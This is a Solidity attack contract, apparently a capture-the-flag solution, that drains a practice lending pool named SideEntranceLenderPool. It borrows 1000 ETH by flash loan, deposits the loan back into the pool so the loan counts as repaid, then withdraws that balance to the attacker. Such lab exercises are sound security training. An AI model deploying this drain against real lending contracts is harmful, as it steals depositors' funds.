// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract AttackSideEntrance {
    SideEntranceLenderPool public pool;
    address public attacker;
    constructor(address _pool, address _attacker) {
        pool = SideEntranceLenderPool(_pool);
        attacker = _attacker;
    }
    function execute() external payable {
        // deposit it all back into the pool to make the balance go up
        pool.deposit{value: msg.value}();
        // after this, the balance for this contract should be 1000
        // but the ETH is still in the pool, so we have to call the withdraw function to actually transfer it out
    }

    function attack() public {
        // take out a flashloan for 1000 ETH
        pool.flashLoan(1000 ether);
    }

    function sendAll() public {
        require(msg.sender == attacker);
        // withdraw the 1000 ETH to this contract and then send it to our attacker address
        pool.withdraw();
        payable(msg.sender).call{value: address(this).balance}("");
    }

    receive () external payable {}
}